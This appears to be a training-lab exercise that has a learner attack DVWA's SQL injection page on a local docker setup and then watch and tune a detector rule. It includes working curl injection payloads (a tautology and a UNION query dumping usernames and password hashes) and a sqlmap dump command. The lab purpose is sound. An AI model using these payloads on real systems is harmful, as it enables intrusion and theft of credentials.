# Exercise 1 — SQL Injection (T1190)

**Goal:** bypass logic / pull data from the DVWA SQLi page and confirm the
detector flags it (sid:1001).

## Setup

- DVWA Security = **Low**. Log in to <http://localhost:8080>.
- Have `docker compose logs -f detector` open in another terminal.

## Attack

From the attacker box (`docker compose exec attacker bash`):

```bash
# classic tautology — returns every row
curl -s "http://proxy/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" \
  -b "security=low; PHPSESSID=<your-session>" | grep -i first

# dump usernames + password hashes with a UNION
curl -s "http://proxy/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit" \
  -b "security=low; PHPSESSID=<your-session>"
```

> Get `PHPSESSID` from your browser dev tools (Application → Cookies) after login,
> or let `sqlmap` handle it (below).

Automate the whole thing:

```bash
sqlmap -u "http://proxy/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=<your-session>" --batch --dump -T users
```

## Defend

You should see:

```text
🔴 [HIGH] sid:1001 SQL injection attempt ... | MITRE T1190
```

- Which part of the request matched? (`union ... select`, `' or '`, etc.)
- **Tune it:** open [`../detector/rules.py`](../detector/rules.py), find sid 1001,
  and add a pattern for a payload it *missed* (e.g. `order by`, `xp_cmdshell`).
  `docker compose restart detector` and re-run.
- **Think like a defender:** a signature on the payload is noisy and bypassable.
  What would a *behavioral* rule look like (e.g. one source IP suddenly pulling
  far more rows / bytes than normal)?
